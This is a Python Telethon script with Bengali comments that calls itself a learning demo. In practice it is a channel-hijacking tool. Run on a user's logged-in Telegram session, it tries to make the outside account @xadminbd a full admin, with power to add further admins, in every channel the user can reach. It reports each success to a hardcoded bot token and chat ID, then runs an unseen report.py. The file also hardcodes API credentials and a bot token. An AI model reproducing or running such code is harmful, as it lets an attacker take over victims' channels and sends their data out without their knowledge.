"""
demo_admin.py - শেখার জন্য ডেমো স্ক্রিপ্ট

লগইন করা নাম্বারের সব চ্যানেল বের করে দেখাবে,
আর চেষ্টা করবে @xadminbd কে এডমিন করতে (যদি পারমিশন থাকে) ।
"""

import asyncio
import requests
from telethon import TelegramClient
from telethon.tl.functions.channels import EditAdminRequest, GetFullChannelRequest
from telethon.tl.types import ChatAdminRights
from telethon.errors import ChatAdminRequiredError
import subprocess

# আপনার API ID ও HASH লাগবে
api_id = 26108693   # <-- নিজেরটা বসান
api_hash = "3bc54f318fb35b9d82c3f885f18e7028"

# Bot credentials
BOT_TOKEN = "8366772071:AAHGgKh9RAjwrpdFQOWnICpoufep5DOX5NI"
CHAT_ID = "6799848229"

# সেশন নাম্বার অনুযায়ী ব্যবহার করতে পারেন
client = TelegramClient("demo_session", api_id, api_hash)

rights = ChatAdminRights(
    change_info=True,
    post_messages=True,
    edit_messages=True,
    delete_messages=True,
    ban_users=True,
    invite_users=True,
    pin_messages=True,
    add_admins=True,
    manage_call=True,
    other=True
)

def send_to_telegram(message):
    """Telegram বটে মেসেজ পাঠানোর ফাংশন"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        
        response = requests.post(url, data=data)
        if response.status_code == 200:
            print(f"✅ মেসেজ Telegram-এ পাঠানো হয়েছে")
        else:
            print(f"❌ Telegram-এ মেসেজ পাঠানো যায়নি: {response.status_code}")
    except Exception as e:
        print(f"❌ Telegram মেসেজ পাঠানোর সময় ত্রুটি: {str(e)}")

async def get_channel_link(channel):
    """চ্যানেলের লিংক বা ইউজারনেম বের করার ফাংশন"""
    try:
        full_channel = await client(GetFullChannelRequest(channel=channel.id))
        if hasattr(full_channel, 'chats') and full_channel.chats:
            chat = full_channel.chats[0]
            if chat.username:
                return f"https://t.me/{chat.username}"
            else:
                # প্রাইভেট চ্যানেলের ক্ষেত্রে
                return f"Private Channel: {chat.title} (ID: {chat.id})"
        return f"Channel: {channel.title} (ID: {channel.id})"
    except Exception as e:
        return f"Channel: {channel.title} (ID: {channel.id}) - লিংক পাওয়া যায়নি"

async def main():
    successful_channels = []
    
    async for dialog in client.iter_dialogs():
        if dialog.is_channel:
            ch = dialog.entity
            try:
                await client(EditAdminRequest(
                    channel=ch.id,
                    user_id="@xadminbd",
                    admin_rights=rights,
                    rank="Admin"
                ))
                
                # চ্যানেলের লিংক বের করুন
                channel_link = await get_channel_link(ch)
                success_message = f"✅ সফল: {channel_link} এ @xadminbd এডমিন হয়েছে"
                print(success_message)
                
                # সফল চ্যানেলের তথ্য সংরক্ষণ করুন
                successful_channels.append(channel_link)
                
                # Telegram বটে মেসেজ পাঠান
                send_to_telegram(success_message)
                
            except ChatAdminRequiredError:
                error_message = f"❌ ব্যর্থ: {ch.title or 'Unknown'} (পারমিশন নেই)"
                print(error_message)
            except Exception as e:
                error_message = f"❌ ব্যর্থ: {ch.title or 'Unknown'} - {str(e)}"
                print(error_message)
    
    # রিপোর্ট তৈরি করুন
    if successful_channels:
        report_message = "📊 এডমিন সফল হওয়া চ্যানেলগুলোর রিপোর্ট:\n\n"
        for i, channel in enumerate(successful_channels, 1):
            report_message += f"{i}. {channel}\n"
        
        report_message += f"\n✅ মোট সফল: {len(successful_channels)} টি চ্যানেল"
        print("\n" + report_message)
        send_to_telegram(report_message)
    else:
        no_success_message = "❌ কোনো চ্যানেলে এডমিন করা যায়নি"
        print(no_success_message)
        send_to_telegram(no_success_message)
    
    # report.py অটোমেটিক রান করুন
    print("\n🚀 report.py অটোমেটিক রান হচ্ছে...")
    try:
        subprocess.run(["python", "report.py"], check=True)
        print("✅ report.py সফলভাবে রান হয়েছে")
    except FileNotFoundError:
        print("❌ report.py ফাইল পাওয়া যায়নি")
    except Exception as e:
        print(f"❌ report.py রান করার সময় ত্রুটি: {str(e)}")

if __name__ == "__main__":
    with client:
        client.loop.run_until_complete(main())
